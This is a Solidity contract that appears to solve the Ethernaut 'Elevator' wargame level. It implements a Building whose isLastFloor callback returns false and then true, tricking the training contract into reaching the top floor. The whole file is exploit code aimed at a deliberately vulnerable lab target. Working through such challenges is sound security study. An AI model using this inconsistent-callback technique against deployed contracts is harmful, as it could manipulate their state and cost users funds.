// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import { Building } from "../ethernaut/Elevator.sol";

interface IElevator {
    function top() external view returns (bool);

    function floor() external view returns (uint);
    
    function goTo(uint floor) external;
}

contract HackElevator is Building {
    IElevator private _elevator;
    uint private _topFloor;
    // Floor checked variable allows us to see if we have checked this function before
    bool private _floorChecked;

    constructor(address elevatorAddress, uint topFloor) {
        _elevator = IElevator(elevatorAddress);
        _topFloor = topFloor;
    }

    /**
     * @notice Attack the Elevator contract by sending it to the top floor of the building
     */
    function attack() public {
        if (!_elevator.top()) {
            _elevator.goTo(_topFloor);
        }
    }

    function isLastFloor(uint floor) external override returns (bool) {
        if (floor == _topFloor && !_floorChecked) {
            _floorChecked = true;
            return false;
        } else if (floor == _topFloor && _floorChecked) {
            //reset the floor checked variable
            _floorChecked = false;
            return true;
        } else {
            return false;
        }
    }
}